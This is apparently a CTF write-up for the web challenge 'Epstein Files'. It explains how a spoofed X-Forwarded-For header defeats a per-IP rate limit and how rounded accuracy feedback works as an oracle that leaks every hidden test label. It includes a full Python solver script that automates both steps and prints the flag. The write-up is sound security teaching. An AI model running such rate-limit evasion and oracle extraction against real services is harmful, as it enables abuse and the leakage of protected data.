---
title: "[Web] Epstein Files"
description: Writeup for "Epstein Files" from EHAX CTF 2026.
date: 2026-03-01 09:00:00 +0900
categories: [CTF, EHAX CTF 2026]
tags: [Web]
toc: true
comments: false
---

# Epstein Files (EHAX CTF 2026)

---

- **Name:** Epstein Files
- **Category:** Web
- **Difficulty:** ★★☆☆☆

---

## TL;DR

A fake ML competition hides a web exploitation chain.
We bypass the rate limit using `X-Forwarded-For`,
then abuse the accuracy feedback as an oracle
to extract every single ground-truth label.
Finally, we submit a prediction with **exactly 69% accuracy**
to unlock the flag.

```
EH4X{epst3in_d1dnt_k1ll_h1ms3lf_but_th1s_m0d3l_d1d}
```

---

## Overview

The challenge presents a Kaggle-style ML competition.
We are given `train.csv` and `test.csv`.
Each row describes a person
(name, category, bio, aliases, flights, documents, connections, nationality).
The goal is to predict a binary label: `In Black Book` (0 or 1).

The server accepts either a `.csv` or `.pkl` file
and returns an accuracy percentage.

The description says:

> *"your model to be actually epstein worthy
> you need to get accuracy of 0.69"*

At first glance this looks like a pure ML problem.
It is not.

---

## Solution

### 1) Recon

The target is an **Express (Node.js)** server
running on `http://chall.ehax.in:4529`.

Key observations from the HTML source
and response headers:

| Item | Detail |
|------|--------|
| Server | Express (Node.js) |
| Upload | `POST /submit`, field `submission` |
| Allowed files | `.csv` or `.pkl` |
| Rate limit | 5 requests per minute per IP |
| Data files | `/data/train.csv`, `/data/test.csv`, `/data/sample_sub.csv` |

A quick look at the data:

- **train.csv** — 1516 rows, 9 columns
  (including the label `In Black Book`)
- **test.csv** — 2276 rows, 8 columns (no label)
- **sample_sub.csv** — just a column `In Black Book`
  with some 0s and 1s

We also tried Pickle deserialization (RCE) attacks,
but all `.pkl` uploads returned a generic 500 error.
The server likely only processes CSV submissions
through a Python subprocess
and does not actually unpickle custom objects.

---

### 2) Root Cause

Two vulnerabilities make this challenge solvable:

#### Vuln 1 — Rate Limit Bypass via `X-Forwarded-For`

The server trusts the `X-Forwarded-For` header
to identify clients.
By changing this header on every request,
we can **bypass the 5-request-per-minute rate limit entirely**.

```http
POST /submit HTTP/1.1
X-Forwarded-For: 1.2.3.4
```

Each unique IP gets its own fresh rate-limit window.
This gives us **unlimited submissions**.

#### Vuln 2 — Accuracy Oracle

The server returns the exact accuracy
(rounded to the nearest integer percent)
after every submission.

```html
<title>Epstein Comp | Result: 94.00%</title>
```

With unlimited requests and accuracy feedback,
we can **recover every ground-truth label**
one item at a time.

#### The Twist — "Accuracy of 0.69"

The challenge says we need accuracy of **0.69**.
This does **not** mean "at least 69%."
It means **exactly 69%**.

Even 100% accuracy returns `STATUS // SUB-OPTIMAL`.
Only a submission with ≈69% accuracy
triggers the flag page.

---

### 3) Exploit

The full exploit has three phases.

#### Phase A — Build an ML Baseline (~94%)

We train a simple rule-based classifier
and an sklearn ensemble on the training data.
This gives us around 94% accuracy on the test set —
a strong starting point for the oracle.

Key rules that work well:

- `"black book" in bio` → **1**
- category is `socialite / celebrity / royalty` → **1**
- category is `business / politician` → **1**
- category is `associate / academic / legal` → **0** (unless bio says "black book")

#### Phase B — Oracle Attack (94% → 100%)

The idea is simple.
We position our predictions right at the boundary
between 94% and 93%.
Then for each of the 2276 items,
we flip that single prediction and check
whether accuracy goes **up or down**.

**Setup:**
We flip a few items we are confident about
(associates with no "black book" in bio)
from 0→1, deliberately making them wrong,
until accuracy drops from 94% to the 94/93 edge.

**Per-item oracle:**

```
For item i:
  - Create a copy of our boundary predictions
  - Flip item i (0→1 or 1→0)
  - Submit and read accuracy

  If accuracy = 93%  →  our boundary prediction was CORRECT
  If accuracy = 94%  →  our boundary prediction was WRONG
                        (flipping it fixed an error)
```

After ~2300 requests (about 10–15 minutes),
we know the **exact ground truth** for all 2276 items
and achieve **100% accuracy**.

#### Phase C — Submit Exactly 69%

Now we have all the correct answers.
To hit exactly 69%:

```
2276 × 0.69 ≈ 1570 correct predictions
→ We need to flip 706 items to make them wrong
```

We take the ground truth, flip the first 706 items,
and submit.
The server responds with a special
**DECLASSIFIED DATA** page containing the flag:

```
EH4X{epst3in_d1dnt_k1ll_h1ms3lf_but_th1s_m0d3l_d1d}
```

---

### 4) Why It Works

The core issue is a **trust boundary problem**.

The server uses `X-Forwarded-For` for rate limiting
but sits behind no reverse proxy
that would sanitize this header.
Any client can set it to any value.

This converts a rate-limited, opaque evaluation service
into an **unlimited accuracy oracle**.

Combined with the fact that accuracy is returned
as a rounded integer,
we can use a **boundary technique**:
position our score right at a rounding threshold,
then flip one item at a time
to observe whether the score ticks up or down.

One flip = one bit of information = one ground-truth label.

Finally, the challenge has a non-obvious win condition:
the threshold is not "at least 69%"
but "exactly 69%."
This is hinted by the phrasing
*"get accuracy of 0.69"*
(not "get accuracy above 0.69").

**Vulnerability chain summary:**

```
X-Forwarded-For bypass
        ↓
Unlimited submissions
        ↓
  Oracle attack
        ↓
100% ground truth
        ↓
 Submit at 69%
        ↓
      FLAG!
```

---

## Solver

<details>
<summary>Click to expand full solver script</summary>

```python
#!/usr/bin/env python3
"""
EPSTEIN FILES — eHax CTF 2026 (Web, 458 pts)
Vulnerability Chain:
  1. X-Forwarded-For → Rate Limit Bypass
  2. Accuracy feedback → Oracle Attack
  3. Submit exactly 69% → Flag
"""

import csv, subprocess, re, sys, os

TARGET = "http://chall.ehax.in:4529"
ip_counter = 0


def submit(preds):
    """Submit predictions via CSV with rotating IP."""
    global ip_counter
    ip_counter += 1
    ip = f"{(ip_counter >> 16) & 255}.{(ip_counter >> 8) & 255}.{ip_counter & 255}.1"

    with open("/tmp/payload.csv", "w") as f:
        f.write("In Black Book\n")
        for p in preds:
            f.write(f"{p}\n")

    r = subprocess.run(
        ["curl", "-s", "-H", f"X-Forwarded-For: {ip}",
         "-F", "submission=@/tmp/payload.csv",
         f"{TARGET}/submit"],
        capture_output=True, text=True, timeout=15,
    )

    # Check for flag
    m = re.search(r"(EH4X\{[^}]+\}|EHAX\{[^}]+\})", r.stdout)
    if m:
        return {"flag": m.group(1)}

    # Parse accuracy
    m = re.search(r"Result: ([\d.]+)%", r.stdout)
    if m:
        return {"acc": int(float(m.group(1)))}
    return {"acc": None}


# ── Step 1: Download data ──────────────────────
print("[*] Step 1: Downloading data...")
for name in ["train.csv", "test.csv"]:
    if not os.path.exists(name):
        subprocess.run(
            ["curl", "-s", "-o", name, f"{TARGET}/data/{name}"]
        )

with open("train.csv") as f:
    train = list(csv.DictReader(f))
with open("test.csv") as f:
    test = list(csv.DictReader(f))
N = len(test)


# ── Step 2: Rule-based ML baseline (~94%) ──────
print("[*] Step 2: Building ML baseline...")
ml_preds = []
for row in test:
    cat = row.get("Category", "")
    bio = row.get("Bio", "").lower()
    aliases = row.get("Aliases", "[]")
    conns = int(row.get("Connections", 0))
    pred = 0
    if "black book" in bio or "listed in epstein" in bio:
        pred = 1
    elif cat in ["socialite", "celebrity", "royalty",
                 "business", "politician"]:
        pred = 1
    elif cat == "other":
        if aliases not in ["[]", "", "['']"] or conns >= 2:
            pred = 1
    elif cat in ["associate", "academic", "legal"]:
        if "black book" in bio:
            pred = 1
    ml_preds.append(pred)

r = submit(ml_preds)
print(f"    Baseline accuracy: {r.get('acc', '?')}%")


# ── Step 3: Oracle — find the boundary ─────────
print("[*] Step 3: Finding 94%/93% boundary...")
confident_zeros = [
    i for i, row in enumerate(test)
    if ml_preds[i] == 0
    and row.get("Category", "") in [
        "associate", "military-intelligence"
    ]
    and "black book" not in row.get("Bio", "").lower()
]

boundary = ml_preds.copy()
flipped = set()
for idx in confident_zeros:
    boundary[idx] = 1 - boundary[idx]
    flipped.add(idx)
    r = submit(boundary)
    if r.get("acc") is not None and r["acc"] <= 93:
        boundary[idx] = 1 - boundary[idx]
        flipped.discard(idx)
        break

print(f"    Boundary ready ({len(flipped)} items flipped)")


# ── Step 4: Oracle — extract all labels ────────
print(f"[*] Step 4: Extracting {N} labels...")
truth = [0] * N
errors = 0

for i in range(N):
    probe = boundary.copy()
    probe[i] = 1 - probe[i]
    r = submit(probe)
    acc = r.get("acc")

    if acc == 93:
        truth[i] = boundary[i]
    elif acc == 94:
        truth[i] = 1 - boundary[i]
        errors += 1
    else:
        truth[i] = ml_preds[i]

    if (i + 1) % 500 == 0:
        print(f"    {i+1}/{N} done, {errors} errors fixed")

r = submit(truth)
print(f"    Ground truth extracted → {r.get('acc')}%")


# ── Step 5: Submit exactly 69% ─────────────────
print("[*] Step 5: Submitting at 69%...")
target_correct = int(N * 0.69)
wrong_needed = N - target_correct

final = truth.copy()
for i in range(wrong_needed):
    final[i] = 1 - final[i]

r = submit(final)
if "flag" in r:
    print(f"\n[✓] FLAG: {r['flag']}")
else:
    print(f"    Result: {r}")
```

</details>

---

## Flag

```
EH4X{epst3in_d1dnt_k1ll_h1ms3lf_but_th1s_m0d3l_d1d}
```
